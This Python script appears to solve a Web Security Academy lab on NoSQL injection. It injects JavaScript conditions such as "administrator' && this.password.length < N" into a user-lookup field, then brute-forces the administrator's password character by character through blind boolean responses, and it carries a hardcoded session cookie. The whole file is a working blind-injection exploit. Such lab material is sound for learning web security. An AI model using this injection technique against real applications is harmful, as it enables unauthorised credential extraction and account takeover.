import requests
import urllib

def send_request(user: str) -> str:
    data = { 'user': user }
    cookies = {'session': 'G8Nb93b7ibgNe7ZBo165rRVUDXEUHefi'}
    headers = {
        'Referer': 'https://0aa100f304214db3838ba53f00550033.web-security-academy.net/my-account?id=wiener/my-account?id=wiener',
        'Host': '0aa100f304214db3838ba53f00550033.web-security-academy.net',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Accept-Language': 'en-US,en;q=0.9',
        'Sec-Ch-Ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) '+
            'Chrome/139.0.0.0 Safari/537.36',
        'Sec-Ch-Ua-Mobile': '?0',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty'
    }
    response = requests.get('https://0aa100f304214db3838ba53f00550033.web-security-academy.net/user/lookup?user=administrator', params = data, cookies = cookies, headers = headers)
    return response.text


def check_if_error_length(length: int) -> bool:
    response = send_request(f"administrator' && this.password.length < {length} && '1'=='1")
    print(f'{length:02d}: {response = }')
    return 'email' in response

def check_password_char_at_index(char: str, index: int) -> bool:
    response = send_request(f"administrator' && this.password[{index}].match('{char}') && '1'=='1")
    return 'email' in response


# find the password length
password_length = 1
while not check_if_error_length(password_length):
    password_length += 1
print(f'{password_length = }')

# brute force the password (lowercase letters only)
password_prefix = ''
alphabet = 'abcdefghijklmnopqrstuvwxyz'
for password_index in range(0, password_length):
    # try every lowercase letter
    for char in alphabet:
        if check_password_char_at_index(char, password_index):
            password_prefix += char 
            print(f'{password_index = }: {char = }')
            break
print(f'{password_prefix = }')
